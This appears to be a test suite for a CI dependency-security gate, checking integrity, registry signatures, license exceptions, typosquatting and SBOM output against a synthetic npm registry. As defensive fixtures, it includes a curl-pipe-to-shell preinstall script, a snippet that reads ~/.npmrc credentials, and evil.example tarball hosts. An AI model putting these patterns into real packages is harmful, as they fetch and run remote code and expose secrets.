"""BUILD-FLOFI-CI-ARCHITECTURE-001: automatic dependency security, canonical SBOM and ledger binding (Tests A-R).

Everything runs offline: a synthetic workspace and lockfile, a synthetic registry and a disposable P-256 key standing in
for npm's registry key. The real npm keys are exercised with one recorded registry signature.
"""

import base64
from contextlib import redirect_stdout
import copy
import datetime
import hashlib
import io
import json
import os
from pathlib import Path
import re
import shutil
import subprocess
import tempfile
import unittest
from unittest.mock import patch

import dependency_security as ds
import governance_lite
import sbom_verify

ROOT = Path(__file__).resolve().parents[1]
NODE = shutil.which("node") or "node"
NOW = datetime.datetime(2026, 11, 1, 12, 0, tzinfo=datetime.timezone.utc)
REVISION, OTHER_REVISION = "a" * 40, "b" * 40


def iso(moment):
    return moment.isoformat().replace("+00:00", "Z")


def integrity_of(seed):
    return "sha512-" + base64.b64encode(hashlib.sha512(seed.encode()).digest()).decode()


def quoted(key):
    return f"'{key}'" if key.startswith("@") else key


class Signer:
    """A disposable P-256 key in npm's signature scheme (name@version:integrity), generated per test run."""

    keyid = "SHA256:flofi-disposable-test-registry-key"

    def __init__(self):
        script = ("const { generateKeyPairSync } = require('node:crypto'); const k = generateKeyPairSync('ec', { namedCurve: 'P-256' });"
                  "process.stdout.write(JSON.stringify({ priv: k.privateKey.export({ type: 'pkcs8', format: 'pem' }),"
                  " pub: k.publicKey.export({ type: 'spki', format: 'der' }).toString('base64') }))")
        keys = json.loads(subprocess.run([NODE, "-e", script], capture_output=True, text=True, check=True).stdout)
        self.private, self.public = keys["priv"], keys["pub"]

    def sign(self, messages):
        script = ("const { createPrivateKey, sign } = require('node:crypto'); const i = JSON.parse(require('fs').readFileSync(0, 'utf8'));"
                  "const k = createPrivateKey(i.priv); process.stdout.write(JSON.stringify(i.messages.map(m => sign('sha256', Buffer.from(m), k).toString('base64'))))")
        return json.loads(subprocess.run([NODE, "-e", script], input=json.dumps({"priv": self.private, "messages": messages}),
                                         capture_output=True, text=True, check=True).stdout)


def base_world():
    """A small resolved graph: two importers, one transitive dependency and one optional LGPL platform binary."""
    return {
        "importers": {".": {"devDependencies": {"tool-kit": "2.0.0"}},
                      "packages/a": {"dependencies": {"left-pad": "1.3.0"}}},
        "specifiers": {},
        "packages": {
            "left-pad@1.3.0": {"license": "MIT"},
            "tool-kit@2.0.0": {"license": "Apache-2.0", "deps": {"tiny-helper": "1.1.0"},
                               "optional_deps": {"@img/lgpl-binary-linux-x64": "1.0.0"}},
            "tiny-helper@1.1.0": {"license": "ISC"},
            "@img/lgpl-binary-linux-x64@1.0.0": {"license": "LGPL-3.0-or-later", "optional": True, "os": ["linux"], "cpu": ["x64"]},
        },
    }


def lock_text(world):
    out = ["lockfileVersion: '9.0'", "", "settings:", "  autoInstallPeers: false", "  excludeLinksFromLockfile: false", "",
           "importers:", ""]
    for path, groups in world["importers"].items():
        if not any(groups.values()):
            out += [f"  {path}: {{}}", ""]
            continue
        out.append(f"  {path}:")
        for group, dependencies in groups.items():
            out.append(f"    {group}:")
            for name, version in dependencies.items():
                specifier = world["specifiers"].get((path, name), version)
                out += [f"      {quoted(name)}:", f"        specifier: {specifier}", f"        version: {version}"]
        out.append("")
    out += ["packages:", ""]
    for identity, package in sorted(world["packages"].items()):
        out.append(f"  {quoted(identity)}:")
        integrity = package.get("integrity") or integrity_of("archive:" + identity)
        out.append("    resolution: " + package.get("resolution", f"{{integrity: {integrity}}}"))
        for label in ("os", "cpu"):
            if package.get(label):
                out.append(f"    {label}: [{', '.join(package[label])}]")
        out.append("")
    out += ["snapshots:", ""]
    for identity, package in sorted(world["packages"].items()):
        groups = [("dependencies", package.get("deps") or {}), ("optionalDependencies", package.get("optional_deps") or {})]
        if not any(items for _, items in groups) and not package.get("optional"):
            out += [f"  {quoted(identity)}: {{}}", ""]
            continue
        out.append(f"  {quoted(identity)}:")
        for group, items in groups:
            if items:
                out.append(f"    {group}:")
                out += [f"      {quoted(name)}: {version}" for name, version in items.items()]
        if package.get("optional"):
            out.append("    optional: true")
        out.append("")
    return "\n".join(out)


class Harness(unittest.TestCase):
    """A synthetic repository (same policy schema, .npmrc and workspace rules as FloFi) and registry."""

    @classmethod
    def setUpClass(cls):
        cls.signer = Signer()

    def setUp(self):
        scratch = tempfile.TemporaryDirectory()
        self.addCleanup(scratch.cleanup)
        self.root = Path(scratch.name) / "repo"
        self.temp = Path(scratch.name) / "runner"
        self.temp.mkdir()
        self.world = base_world()
        self.policy = json.loads((ROOT / ds.POLICY_PATH).read_text())
        self.policy["registry_signatures"]["keys"].append({"keyid": Signer.keyid, "key": self.signer.public, "expires": None})
        self.policy["exceptions"] = [{
            "id": "lgpl-binary", "resolves": ["license-review"], "packages": ["@img/lgpl-binary-linux-x64"],
            "license": "LGPL-3.0-or-later", "parents": ["tool-kit"], "optional": True, "platform_restricted": True,
            "reason": "Fixture: an unmodified, dynamically loaded optional LGPL platform binary.",
            "approved_by": "Owner", "approved_at": "2026-11-01", "record": "docs/builds/BUILD-FLOFI-CI-ARCHITECTURE-001.md"}]
        self.workspace = ("packages:\n  - packages/*\nminimumReleaseAge: 0\npmOnFail: error\nstrictPeerDependencies: true\n"
                          "autoInstallPeers: false\n")
        self.npmrc = (ROOT / ".npmrc").read_text()
        self.audit = {"advisories": {}, "metadata": {}}
        self.missing, self.offline = set(), set()
        self.env = patch.dict(os.environ, {"FLOFI_CI_REVISION": REVISION, "RUNNER_TEMP": str(self.temp)})
        self.env.start()
        self.addCleanup(self.env.stop)
        os.environ.pop("GITHUB_STEP_SUMMARY", None)

    # -- world construction ---------------------------------------------------------------------------------------------
    def package(self, identity):
        return self.world["packages"][identity]

    def write_repository(self):
        if self.root.exists():
            shutil.rmtree(self.root / "packages", ignore_errors=True)
        (self.root / "docs/security").mkdir(parents=True, exist_ok=True)
        for identity, package in self.world["packages"].items():
            package.setdefault("integrity", integrity_of("archive:" + identity))
        manifests = {".": {"name": "fixture-root", "version": "0.1.0", "private": True, "license": "Apache-2.0"},
                     "packages/a": {"name": "@defi-workflow-engine/a", "version": "0.1.0", "private": True, "license": "Apache-2.0"}}
        for path, groups in self.world["importers"].items():
            manifest = manifests.setdefault(path, {"name": "@defi-workflow-engine/" + path.rsplit("/", 1)[-1], "version": "0.1.0",
                                                   "private": True, "license": "Apache-2.0"})
            for group, dependencies in groups.items():
                manifest[group] = {name: self.world["specifiers"].get((path, name), version) for name, version in dependencies.items()}
        for path, manifest in manifests.items():
            (self.root / path).mkdir(parents=True, exist_ok=True)
            (self.root / path / "package.json").write_text(json.dumps(manifest))
        (self.root / "pnpm-lock.yaml").write_text(lock_text(self.world))
        (self.root / "pnpm-workspace.yaml").write_text(self.workspace)
        (self.root / ".npmrc").write_text(self.npmrc)
        (self.root / ds.POLICY_PATH).write_text(json.dumps(self.policy, indent=1))

    def registry(self):
        documents, messages, slots = {}, [], []
        for identity, package in sorted(self.world["packages"].items()):
            name, version = ds.split_identity(identity)
            document = documents.setdefault(name, {"name": name, "versions": {}, "time": {"created": package.get("created", "2019-01-01T00:00:00.000Z")}})
            prior = package.get("prior", {"version": "0.9.0"})
            for index in range(package.get("history", 12 if prior is not None else 0)):
                filler = f"0.0.{index}"
                document["versions"][filler] = {"name": name, "version": filler, "license": "MIT",
                                                "dist": {"integrity": integrity_of(name + filler), "tarball": f"https://registry.npmjs.org/{name}/-/x-{filler}.tgz"}}
                document["time"][filler] = "2019-06-01T00:00:00.000Z"
            releases = []
            if prior is not None:
                releases.append((prior["version"], {"license": package.get("license"), "publisher": "maintainer", **prior},
                                 prior.get("published", "2020-01-01T00:00:00.000Z"), integrity_of(name + prior["version"])))
            releases.append((version, {**package, "publisher": package.get("publisher", "maintainer")},
                             package.get("published", "2021-01-01T00:00:00.000Z"), package.get("registry_integrity", package["integrity"])))
            for release, details, published, integrity in releases:
                body = {"name": details.get("registry_name", name), "version": release, "_npmUser": {"name": details["publisher"]},
                        "dist": {"integrity": integrity, "tarball": details.get(
                            "tarball", f"https://registry.npmjs.org/{name}/-/{name.rsplit('/', 1)[-1]}-{release}.tgz")}}
                if details.get("license", "<absent>") != "<absent>" and details.get("license") is not None:
                    body["license"] = details["license"]
                for key in ("scripts", "deprecated", "hasInstallScript"):
                    if details.get(key):
                        body[key] = details[key]
                if details.get("attested"):
                    body["dist"]["attestations"] = {"url": "https://registry.npmjs.org/-/npm/v1/attestations/x", "provenance": {"predicateType": "https://slsa.dev/provenance/v1"}}
                document["versions"][release] = body
                document["time"][release] = published
                signature = details.get("signature", "valid")
                if signature != "none":
                    message = f"{name}@{release}:{details.get('signed_integrity', integrity)}"
                    messages.append(message)
                    slots.append((body, signature))
        for (body, mode), sig in zip(slots, self.signer.sign(messages)):
            keyid = "SHA256:unknown-registry-key" if mode == "unknown-key" else Signer.keyid
            body["dist"]["signatures"] = [{"keyid": keyid, "sig": sig}]
        return documents

    def fetch_from(self, documents):
        def fetch(url, **_):
            name = url.removeprefix("https://registry.npmjs.org/").replace("%2f", "/")
            if name in self.missing:
                raise RuntimeError("Download stage=registry metadata host=registry.npmjs.org attempt=1: HTTP 404; not retryable")
            if name in self.offline:
                raise RuntimeError("Download stage=registry metadata host=registry.npmjs.org: failed after 3 attempt(s) (connection failure)")
            return json.dumps(documents[name]).encode()
        return fetch

    def run_gate(self, base_world_value=None):
        self.write_repository()
        documents = self.registry()
        base = ds.Graph(lock_text(base_world_value)) if base_world_value else None
        with patch.object(ds, "run_audit", return_value=self.audit), patch.object(ds, "baseline", return_value=(base, False)), \
                redirect_stdout(io.StringIO()) as output:
            evidence = ds.verify(self.root, self.temp / ds.EVIDENCE_NAME, base_ref="origin/main" if base else None,
                                 fetch=self.fetch_from(documents), now=NOW)
        self.output = output.getvalue()
        return evidence

    def findings(self, evidence, identity=None):
        rows = [(r["identity"], f) for r in evidence["packages"] for f in r["findings"] if "resolved_by" not in f]
        rows += [("<configuration>", f) for f in evidence["global_findings"]]
        return {(subject, f["code"], f["decision"]) for subject, f in rows if identity is None or subject == identity}

    def assert_pass(self, evidence):
        self.assertEqual(evidence["decision"], ds.PASS, json.dumps(sorted(self.findings(evidence)), indent=1))

    def sbom(self):
        """What pnpm 11.22.0 writes with --lockfile-only: registry components, a root and a spanning set of edges."""
        graph = ds.Graph((self.root / "pnpm-lock.yaml").read_text())
        components = []
        for identity in graph.identities():
            name, version = ds.split_identity(identity)
            group, _, short = name.rpartition("/")
            component = {"type": "library", "name": short, "version": version, "purl": sbom_verify.purl(identity),
                         "bom-ref": sbom_verify.purl(identity),
                         "externalReferences": [{"type": "distribution", "url": f"https://registry.npmjs.org/{name}/-/{short}-{version}.tgz",
                                                 "hashes": [{"alg": "SHA-512", "content": base64.b64decode(graph.integrity(identity)[7:]).hex()}]}]}
            if group:
                component["group"] = group
            components.append(component)
        root_ref = "pkg:npm/fixture-root@0.1.0"
        direct = sorted({sbom_verify.purl(ds.dependency_identity(n, e["version"])) for d in graph.direct.values() for n, e in d.items()})
        dependencies = [{"ref": root_ref, "dependsOn": direct}] + [
            {"ref": sbom_verify.purl(i), "dependsOn": sorted(sbom_verify.purl(c) for c in graph.children.get(i, ()))} for i in graph.identities()]
        return {"bomFormat": "CycloneDX", "specVersion": "1.6", "components": components, "dependencies": dependencies,
                "metadata": {"component": {"type": "library", "name": "fixture-root", "version": "0.1.0", "bom-ref": root_ref,
                                           "licenses": [{"license": {"id": "Apache-2.0"}}]}}}

    def validate_sbom(self, document=None):
        path = self.temp / "flofi-sbom.cdx.json"
        path.write_text(json.dumps(document or self.sbom()))
        with redirect_stdout(io.StringIO()), patch("sys.stderr", io.StringIO()) as errors:
            status = sbom_verify.main([str(path), str(self.temp / ds.EVIDENCE_NAME), "--root", str(self.root)])
        self.assertFalse(path.exists(), "the SBOM is removed after success or failure")
        return status, errors.getvalue()

    def add(self, identity, parent=None, **details):
        self.world["packages"][identity] = {"license": "MIT", **details}
        if parent:
            self.package(parent).setdefault("deps", {})[ds.split_identity(identity)[0]] = ds.split_identity(identity)[1]
        return identity


class AutomaticAcceptance(Harness):
    def test_baseline_graph_passes_with_one_license_exception(self):
        evidence = self.run_gate()
        self.assert_pass(evidence)
        self.assertEqual(evidence["summary"]["packages"], 4)
        self.assertEqual(evidence["summary"]["registry_signatures_verified"], 4)
        self.assertEqual(evidence["summary"]["exceptions_used"], ["lgpl-binary"])
        self.assertEqual(evidence["revision"], REVISION)
        self.assertEqual(evidence["policy"]["sha256"], hashlib.sha256((self.root / ds.POLICY_PATH).read_bytes()).hexdigest())
        record = next(r for r in evidence["packages"] if r["identity"] == "left-pad@1.3.0")
        for field in ("identity", "version", "source", "integrity", "change", "advisories", "license", "provenance", "findings", "decision"):
            self.assertIn(field, record)
        self.assertEqual(json.loads((self.temp / ds.EVIDENCE_NAME).read_text()), evidence)

    def test_a_recent_safe_dependency_passes_without_waiver_or_approval(self):
        policy_before = json.dumps(self.policy, sort_keys=True)
        self.add("fresh-lib@3.0.0", parent="tool-kit@2.0.0", published=iso(NOW - datetime.timedelta(minutes=5)))
        evidence = self.run_gate()
        self.assert_pass(evidence)
        record = next(r for r in evidence["packages"] if r["identity"] == "fresh-lib@3.0.0")
        self.assertIn("recently-published", record["signals"])  # a risk signal, never a waiting period
        self.assertEqual(record["capability_scan"]["status"], "not-installed")
        self.assertEqual(json.dumps(self.policy, sort_keys=True), policy_before)

    def test_r_publication_age_never_changes_the_decision(self):
        decisions = []
        for age in (datetime.timedelta(minutes=1), datetime.timedelta(days=8), datetime.timedelta(days=900)):
            self.world = base_world()
            self.add("dep@1.0.0", parent="tool-kit@2.0.0", published=iso(NOW - age))
            decisions.append(self.run_gate()["decision"])
        self.assertEqual(decisions, [ds.PASS] * 3)

    def test_b_graph_expansion_updates_the_computed_inventory(self):
        before = copy.deepcopy(self.world)
        for index in range(3):
            self.add(f"new-dep-{index}@1.0.{index}", parent="tool-kit@2.0.0", license=["MIT", "BSD-3-Clause", "0BSD"][index])
        self.world["importers"]["packages/a"]["dependencies"]["new-direct"] = "4.2.0"
        self.add("new-direct@4.2.0")
        evidence = self.run_gate(base_world_value=before)
        self.assert_pass(evidence)
        self.assertEqual(evidence["summary"]["packages"], 8)
        self.assertEqual(evidence["lockfile"]["registry_packages"], 8)
        self.assertEqual(evidence["summary"]["changes"], {"added": 4, "unchanged": 4})
        status, errors = self.validate_sbom()
        self.assertEqual(status, 0, errors)

    def test_c_recent_security_patch_passes_while_the_vulnerable_release_blocks(self):
        self.add("parser-lib@1.0.4", parent="tool-kit@2.0.0")
        self.audit = {"advisories": {"1": {"id": 1, "module_name": "parser-lib", "severity": "moderate", "github_advisory_id": "GHSA-xxxx-yyyy-zzzz",
                                           "title": "ReDoS", "vulnerable_versions": "<1.0.5", "patched_versions": ">=1.0.5",
                                           "findings": [{"version": "1.0.4", "paths": ["packages/a>tool-kit>parser-lib"]}]}}}
        evidence = self.run_gate()
        self.assertEqual(evidence["decision"], ds.BLOCK)
        self.assertIn(("parser-lib@1.0.4", "vulnerability", ds.BLOCK), self.findings(evidence))
        record = next(r for r in evidence["packages"] if r["identity"] == "parser-lib@1.0.4")
        self.assertEqual(record["advisories"][0]["paths"], ["packages/a>tool-kit>parser-lib"])
        # The fix was published an hour ago: it is accepted immediately.
        del self.world["packages"]["parser-lib@1.0.4"]
        self.add("parser-lib@1.0.5", published=iso(NOW - datetime.timedelta(hours=1)))
        self.package("tool-kit@2.0.0")["deps"]["parser-lib"] = "1.0.5"
        self.audit = {"advisories": {}}
        self.assert_pass(self.run_gate())

    def test_d_ordinary_transitive_update_needs_no_inventory_edit(self):
        before = copy.deepcopy(self.world)
        del self.world["packages"]["tiny-helper@1.1.0"]
        self.add("tiny-helper@1.2.0", deps={"tiny-helper-core": "1.0.0"})
        self.add("tiny-helper-core@1.0.0", license="BSD-2-Clause")
        self.package("tool-kit@2.0.0")["deps"]["tiny-helper"] = "1.2.0"
        evidence = self.run_gate(base_world_value=before)
        self.assert_pass(evidence)
        changes = {r["identity"]: r["change"] for r in evidence["packages"]}
        self.assertEqual((changes["tiny-helper@1.2.0"], changes["tiny-helper-core@1.0.0"]), ("upgraded", "added"))
        self.assertEqual(next(r for r in evidence["packages"] if r["identity"] == "tiny-helper-core@1.0.0")["dependents"], ["tiny-helper"])
        self.assertEqual(self.validate_sbom()[0], 0)

    def test_e_unchanged_and_excepted_packages_need_no_repeated_approval(self):
        first, second = self.run_gate(), self.run_gate()
        self.assertEqual([r["decision"] for r in first["packages"]], [r["decision"] for r in second["packages"]])
        self.assert_pass(second)
        # A routine upgrade of the excepted LGPL binary (same license, same role) is accepted without a new approval.
        del self.world["packages"]["@img/lgpl-binary-linux-x64@1.0.0"]
        self.add("@img/lgpl-binary-linux-x64@1.1.0", license="LGPL-3.0-or-later", optional=True, os=["linux"], cpu=["x64"])
        self.package("tool-kit@2.0.0")["optional_deps"]["@img/lgpl-binary-linux-x64"] = "1.1.0"
        self.assert_pass(self.run_gate())


class SecurityRejection(Harness):
    def test_f_integrity_mismatch_and_altered_content_block(self):
        self.package("left-pad@1.3.0")["registry_integrity"] = integrity_of("registry serves different bytes")
        evidence = self.run_gate()
        self.assertEqual(evidence["decision"], ds.BLOCK)
        self.assertIn(("left-pad@1.3.0", "integrity-mismatch", ds.BLOCK), self.findings(evidence))
        # A lockfile pointing at altered content that the registry also reports is still caught: npm never signed it.
        self.package("left-pad@1.3.0").pop("registry_integrity")
        self.package("left-pad@1.3.0")["signed_integrity"] = integrity_of("the archive npm actually signed")
        evidence = self.run_gate()
        self.assertIn(("left-pad@1.3.0", "registry-signature-invalid", ds.BLOCK), self.findings(evidence))
        self.package("left-pad@1.3.0").pop("signed_integrity")
        self.package("left-pad@1.3.0")["resolution"] = "{integrity: sha1-AAAAAAAAAAAAAAAAAAAAAAAAAAA=}"
        self.assertIn(("left-pad@1.3.0", "integrity-missing", ds.BLOCK), self.findings(self.run_gate()))

    def test_g_disallowed_vulnerabilities_block_and_cannot_be_excepted(self):
        for severity in ("low", "moderate", "high", "critical"):
            with self.subTest(severity=severity):
                self.audit = {"advisories": {"7": {"id": 7, "module_name": "left-pad", "severity": severity, "github_advisory_id": "GHSA-aaaa-bbbb-cccc",
                                                   "findings": [{"version": "1.3.0", "paths": ["packages/a>left-pad"]}]}}}
                self.assertIn(("left-pad@1.3.0", "vulnerability", ds.BLOCK), self.findings(self.run_gate()))
        bad = copy.deepcopy(self.policy)
        bad["exceptions"].append({**bad["exceptions"][0], "id": "hide-advisory", "resolves": ["vulnerability"],
                                  "identity": "left-pad@1.3.0", "integrity": integrity_of("x"), "packages": None})
        del bad["exceptions"][-1]["packages"]
        self.assertTrue(any("mandatory control" in e for e in ds.policy_errors(bad)))

    def test_h_license_policy(self):
        cases = {"GPL-3.0-only": ds.BLOCK, "AGPL-3.0-or-later": ds.BLOCK, "UNLICENSED": ds.BLOCK, "MIT AND GPL-2.0-only": ds.BLOCK,
                 "(MIT OR GPL-3.0-only)": ds.PASS, "Apache-2.0 OR MIT": ds.PASS, "BlueOak-1.0.0": ds.PASS, "MPL-2.0": ds.REVIEW,
                 "SEE LICENSE IN LICENSE.md": ds.REVIEW, "LicenseRef-Proprietary": ds.REVIEW, "GPL-2.0-only WITH Classpath-exception-2.0": ds.REVIEW,
                 "Made-Up-License": ds.REVIEW, None: ds.REVIEW}
        for license_id, decision in cases.items():
            with self.subTest(license=license_id):
                self.package("left-pad@1.3.0")["license"] = license_id
                record = next(r for r in self.run_gate()["packages"] if r["identity"] == "left-pad@1.3.0")
                self.assertEqual(record["decision"], decision, record["findings"])
        self.assertEqual(ds.evaluate_license(None, self.policy["licenses"])[0], "missing")

    def test_h_license_exception_is_bound_to_license_role_and_parents(self):
        mutations = {"license": lambda: self.package("@img/lgpl-binary-linux-x64@1.0.0").update(license="GPL-3.0-only"),
                     "license-variant": lambda: self.package("@img/lgpl-binary-linux-x64@1.0.0").update(license="LGPL-2.1-only"),
                     "new-parent": lambda: self.package("left-pad@1.3.0").setdefault("deps", {}).update({"@img/lgpl-binary-linux-x64": "1.0.0"}),
                     "not-optional": lambda: self.package("@img/lgpl-binary-linux-x64@1.0.0").update(optional=False),
                     "unrestricted": lambda: self.package("@img/lgpl-binary-linux-x64@1.0.0").update(os=None, cpu=None)}
        for label, mutate in mutations.items():
            with self.subTest(mutation=label):
                self.world = base_world()
                mutate()
                evidence = self.run_gate()
                self.assertNotEqual(evidence["decision"], ds.PASS)
                if label != "license":
                    finding = next(f for r in evidence["packages"] for f in r["findings"] if r["name"] == "@img/lgpl-binary-linux-x64")
                    self.assertEqual(finding["decision"], ds.REVIEW)
                    self.assertTrue(finding.get("exception_mismatch"))
        self.world = base_world()
        self.policy["exceptions"] = []
        self.assertIn(("@img/lgpl-binary-linux-x64@1.0.0", "license-review", ds.REVIEW), self.findings(self.run_gate()))

    def test_i_suspicious_supply_chain_behavior(self):
        cases = [
            ("install hook introduced", {"scripts": {"postinstall": "node setup.js"}}, ("install-script-introduced", ds.REVIEW)),
            ("install hook in a first release", {"prior": None, "scripts": {"install": "node-gyp rebuild"}}, ("install-script-introduced", ds.REVIEW)),
            ("download and execute", {"scripts": {"preinstall": "curl -s https://example.invalid/x.sh | sh"}}, ("malicious-indicator", ds.BLOCK)),
            ("provenance regression with new publisher", {"prior": {"version": "0.9.0", "attested": True, "publisher": "GitHub Actions"},
                                                          "publisher": "someone-new"}, ("provenance-regression", ds.REVIEW)),
            ("security placeholder", None, ("malicious-indicator", ds.BLOCK)),
            ("compromise notice", {"deprecated": "This version was compromised; do not use"}, ("malicious-indicator", ds.BLOCK)),
            ("unsigned", {"signature": "none"}, ("registry-signature-missing", ds.REVIEW)),
            ("unpinned key", {"signature": "unknown-key"}, ("registry-signature-missing", ds.REVIEW)),
        ]
        for label, details, (code, decision) in cases:
            with self.subTest(case=label):
                self.world = base_world()
                if details is None:
                    identity = self.add("evil-pkg@0.0.1-security", parent="tool-kit@2.0.0")
                else:
                    identity = self.add("helper-plus@2.0.0", parent="tool-kit@2.0.0", **details)
                evidence = self.run_gate()
                self.assertIn((identity, code, decision), self.findings(evidence))
                self.assertNotEqual(evidence["decision"], ds.PASS)
        # Publisher change, provenance drop or a first release alone are recorded signals, not reviews.
        for label, details in (("publisher", {"publisher": "new-maintainer"}), ("provenance", {"prior": {"version": "0.9.0", "attested": True}}),
                               ("first release", {"prior": None}), ("unchanged hook", {"scripts": {"install": "node-gyp rebuild"},
                                                                                       "prior": {"version": "0.9.0", "scripts": {"install": "node-gyp rebuild"}}})):
            with self.subTest(signal=label):
                self.world = base_world()
                self.add("helper-plus@2.0.0", parent="tool-kit@2.0.0", **details)
                self.assert_pass(self.run_gate())

    def test_i_typosquat_and_dependency_confusion(self):
        self.add("lefft-pad@1.0.0", parent="tool-kit@2.0.0", history=0, created=iso(NOW - datetime.timedelta(days=3)))
        self.assertIn(("lefft-pad@1.0.0", "typosquat-suspect", ds.REVIEW), self.findings(self.run_gate()))
        # An established package one edit away (preact next to react) is not a typosquat.
        self.world = base_world()
        self.add("lefft-pad@1.0.0", parent="tool-kit@2.0.0", history=40, created="2015-01-01T00:00:00.000Z")
        self.assert_pass(self.run_gate())
        self.world = base_world()
        self.add("@defi-workflow-engine/a@9.9.9", parent="tool-kit@2.0.0")
        self.assertIn(("@defi-workflow-engine/a@9.9.9", "dependency-confusion", ds.BLOCK), self.findings(self.run_gate()))

    def test_i_capability_scan_flags_credential_exfiltration_shapes(self):
        identity = self.add("tiny-telemetry@1.0.0", parent="tool-kit@2.0.0", prior=None)
        directory = self.root / "node_modules/.pnpm/tiny-telemetry@1.0.0/node_modules/tiny-telemetry"
        directory.mkdir(parents=True)
        (directory / "package.json").write_text(json.dumps({"name": "tiny-telemetry", "version": "1.0.0"}))
        (directory / "index.js").write_text("const https = require('https');\nconst t = require('fs').readFileSync(process.env.HOME + '/.npmrc');\n")
        evidence = self.run_gate()
        self.assertIn((identity, "suspicious-capabilities", ds.REVIEW), self.findings(evidence))
        scan = next(r for r in evidence["packages"] if r["identity"] == identity)["capability_scan"]
        self.assertEqual(scan["files"]["credential-access"], ["index.js"])
        # Network use alone is a recorded capability, not a finding.
        (directory / "index.js").write_text("const https = require('https');\n")
        self.assert_pass(self.run_gate())

    def test_j_unauthorized_source_substitution_blocks(self):
        mutations = {
            "lock tarball": lambda: self.package("left-pad@1.3.0").update(resolution="{integrity: " + integrity_of("x") + ", tarball: https://evil.example/left-pad.tgz}"),
            "registry tarball host": lambda: self.package("left-pad@1.3.0").update(tarball="https://evil.example/left-pad/-/left-pad-1.3.0.tgz"),
            "npmrc registry": lambda: setattr(self, "npmrc", self.npmrc.replace("https://registry.npmjs.org/", "https://mirror.example/")),
            "scoped registry": lambda: setattr(self, "npmrc", self.npmrc + "@img:registry=https://mirror.example/\n"),
            "workspace registry": lambda: setattr(self, "workspace", self.workspace + "registry: https://mirror.example/\n"),
            "file specifier": lambda: self.world["specifiers"].update({("packages/a", "left-pad"): "file:../left-pad"}),
            "git specifier": lambda: self.world["specifiers"].update({("packages/a", "left-pad"): "git+https://example.invalid/x.git"}),
            "registry name mismatch": lambda: self.package("left-pad@1.3.0").update(registry_name="right-pad"),
        }
        for label, mutate in mutations.items():
            with self.subTest(mutation=label):
                self.setUp()
                mutate()
                evidence = self.run_gate()
                self.assertEqual(evidence["decision"], ds.BLOCK, label)
                self.assertTrue({code for _, code, _ in self.findings(evidence)} & {"source-substitution", "metadata-inconsistent"}, label)
        self.setUp()
        self.package("tool-kit@2.0.0")["deps"]["evil-local"] = "link:../../evil"
        self.assertIn(("<configuration>", "source-substitution", ds.BLOCK), self.findings(self.run_gate()))
        self.setUp()
        self.package("tool-kit@2.0.0")["deps"]["ghost"] = "1.0.0"  # a snapshot edge to a package the lockfile never resolved
        self.assertIn(("<configuration>", "metadata-inconsistent", ds.BLOCK), self.findings(self.run_gate()))
        self.setUp()
        self.missing.add("left-pad")
        self.assertIn(("left-pad@1.3.0", "metadata-inconsistent", ds.BLOCK), self.findings(self.run_gate()))

    def test_k_policy_bypass_fails(self):
        for label, change in (("audit ignores", lambda: setattr(self, "workspace", self.workspace + "auditConfig:\n  ignoreGhsas:\n    - GHSA-aaaa-bbbb-cccc\n")),
                              ("lifecycle scripts", lambda: setattr(self, "npmrc", self.npmrc.replace("ignore-scripts=true", "ignore-scripts=false"))),
                              ("build allowance", lambda: setattr(self, "workspace", self.workspace + "onlyBuiltDependencies:\n  - left-pad\n")),
                              ("range specifier", lambda: self.world["specifiers"].update({("packages/a", "left-pad"): "^1.3.0"}))):
            with self.subTest(bypass=label):
                self.setUp()
                change()
                self.assertEqual(self.run_gate()["decision"], ds.BLOCK, label)
        weakenings = {
            "release age": lambda p: p["release_age"].update(minimum_minutes=1440),
            "advisory threshold": lambda p: p["vulnerabilities"].update(block_at_or_above="high"),
            "signatures optional": lambda p: p["registry_signatures"].update(required=False),
            "registry": lambda p: p["registry"].update(url="https://mirror.example/"),
            "copyleft allowed": lambda p: p["licenses"]["allowed"].append("GPL-3.0-only"),
            "prohibited dropped": lambda p: p["licenses"]["prohibited"].remove("AGPL-3.0-only"),
            "typosquat off": lambda p: p["supply_chain"]["typosquat"].update(protected_names=[]),
            "glob exception": lambda p: p["exceptions"][0].update(packages=["@img/*"]),
            "integrity exception": lambda p: p["exceptions"][0].update(resolves=["integrity-mismatch"]),
            "name-scoped install review": lambda p: p["exceptions"][0].update(resolves=["install-script-introduced"]),
            "not owner": lambda p: p["exceptions"][0].update(approved_by="Agent"),
            "typosquat neutered": lambda p: p["supply_chain"]["typosquat"].update(established_min_versions=0),
            "scan neutered": lambda p: p["supply_chain"]["capability_scan"].update(max_package_bytes=0),
        }
        for label, weaken in weakenings.items():
            with self.subTest(weakening=label):
                policy = copy.deepcopy(self.policy)
                weaken(policy)
                self.assertTrue(ds.policy_errors(policy), label)
                self.write_repository()
                (self.root / ds.POLICY_PATH).write_text(json.dumps(policy))
                with self.assertRaises(ds.EvidenceError):
                    ds.load_policy(self.root)

    def test_l_invalid_evidence_never_certifies(self):
        self.offline.add("tiny-helper")
        with self.assertRaises(ds.EvidenceError):
            self.run_gate()
        self.offline.clear()
        with self.assertRaises(ds.EvidenceError), patch.object(ds.shutil, "which", return_value=None):
            ds.verify_signatures([{"message": "x", "signatures": []}], self.policy["registry_signatures"]["keys"])
        with patch.object(ds.subprocess, "run", return_value=subprocess.CompletedProcess([], 0, stdout="not json")), self.assertRaises(ds.EvidenceError):
            ds.run_audit(self.root, pnpm="pnpm")
        self.audit = {"advisories": {"1": {"module_name": "left-pad", "severity": "weird", "findings": []}}}
        with self.assertRaises(ds.EvidenceError):
            self.run_gate()

    def test_real_npm_registry_signature_verifies_against_the_pinned_key(self):
        keys = json.loads((ROOT / ds.POLICY_PATH).read_text())["registry_signatures"]["keys"]
        integrity = "sha512-iny/40PEGkNJQ5/Pv6z3nm6FbRAby32GeZRjCUJk2WnNDbgPSTcdI+DDvLqsgBdD4cD5sMtMheqPPnehCCa8Nw=="
        signature = {"keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
                     "sig": "MEUCIBnLUUnTzxl2Z+M3s8fSGAPcNUolW17SS0KQMV5sJmDSAiEAj4Q5XCHZMOV0YlMjd6iKTAKgWW2Z8HlpPBoOgJ4AKPQ="}
        legacy = {"keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
                  "sig": "MEQCIHtPpKlaDF3QN9vNEImDylgjhVgE1cPX5dxgADkO3cbOAiBDRht6eiKjXoYA0jCizl4yJnAJLrUoRkZtth0Uw0e5aQ=="}
        verdicts = ds.verify_signatures([
            {"message": f"minimatch@11.0.3:{integrity}", "signatures": [signature]},
